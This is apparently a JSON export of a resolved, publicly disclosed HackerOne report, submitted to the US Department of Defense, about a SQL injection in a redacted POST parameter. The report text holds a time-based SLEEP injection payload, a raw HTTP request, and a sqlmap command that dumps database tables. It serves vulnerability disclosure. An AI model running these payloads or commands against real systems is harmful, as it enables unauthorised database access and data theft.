@@ -1,0 +1,111 @@
+{
+  "id": 1262757,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjYyNzU3",
+  "url": "https://hackerone.com/reports/1262757",
+  "title": "SQL injection located in `███` in POST param `████████` ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-07-15T08:36:12.267Z",
+  "submitted_at": "2021-07-15T08:36:12.295Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "brumens",
+    "url": "/brumens",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/x93y4mon7o5qcsy8yvqxgt27ykcb/65551465b0d18d952f306b2d0c5e69ed082a8c9bc5c9b7bec024e5edc01c00a5"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-09-09T20:00:36.835Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-09-07T18:58:05.235Z",
+  "team_member_agreed_on_going_public_at": "2021-09-09T20:00:36.707Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hey DoD security team!\n\nI was able to exploit an SQL injection [1] in one of your domains.\n\n# Description\n\nAn SQL injection [1] was discovered in domain *https://████████/██████* in the parameter *██████████*. The SQL injection was located in a *WHERE* statment fallowed by a *INT* value.\nThe vulnerable parameter gave an indication quick with an *SQL syntax* error. That exposed it was an *████* database [2] in the backend.\n \n# Proof Of Concept\nDiscovered the SQL injection by inputting an random value to trigger an SQL syntax error.\nDiscover_Payload: **██████████**\n████\n\nThe fallowing payload was used for the SQL injection to be be triggered \nPayload: **2021 AND (SELECT 6868 FROM (SELECT(SLEEP(32)))IiOE)**\n██████\n\nFull exploit and gather information from the MYSQL database:\n████\n\n\n## References\n[1] https://portswigger.net/web-security/sql-injection - *SQL injection explained*\n[2] https://www.mysqltutorial.org/mysql-where/ - *MYSQL WHERE statment explained*\n[3] https://www.mysql.com/ - *MYSQL Database*\n\n## Impact\n\nAn attacker is able to gather all information stored in the database using boolen based SQL injection. (FULL database controll.)\n\n## System Host(s)\n███████\n\n## Affected Product(s) and Version(s)\nThe whole database is affected and I'm able to gather all information stored in it.\n\n## CVE Numbers\n\n\n## Steps to Reproduce\n1. Go to the domain **\n2. Now intercept the request with Burp Suite.\n3. Replace the *raw* data with the fallowing:\n```\nPOST /██████ HTTP/1.1\nHost: ██████████\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 106\nOrigin: https://█████████\nReferer: https://████████/█████████\nUpgrade-Insecure-Requests: 1\nTe: trailers\nConnection: close\n\n██████=2021█████\n```\n4 . Save request in Burp Suite => Right click => save item + *Name it*.\n5. Run sqlmap command: **sqlmap -f --risk 2 -r /home/kali/Desktop/sql --dbms=mysql --tables --dump -p ██████████**.\nIt will quick discover the *███* to be vulnerable for SQL injection and XSS. Wait to it detect and verify it. It will then dump the tables.\nas fallowing: (Only gather table and stoped after just as a proof of concept)\n████\n\n## Suggested Mitigation/Remediation Actions\nMake sure to filter out SQL syntax and quotes and never trust user input.\n\n",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 4,
+  "voters": [
+    "al-madjus",
+    "0xsaltyhashes",
+    "khizer47",
+    "shohag_sp"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
